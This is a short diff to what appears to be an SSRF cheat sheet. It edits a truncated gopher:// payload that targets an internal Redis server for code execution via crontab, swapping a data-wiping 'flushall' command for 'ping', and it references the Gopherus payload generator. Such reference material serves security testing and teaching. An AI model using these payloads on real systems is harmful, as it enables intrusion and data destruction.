@@ -1027,7 +1027,7 @@ http://10.0.0.0/8 ranges                # Internal APIs
 `gopher://` payload to write to internal Redis (RCE via writing crontab):
 
 ```text
-gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$ ...
+gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aping%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$ ...
 ```
 
 Generate with `gopherus` (https://github.com/tarunkant/Gopherus).
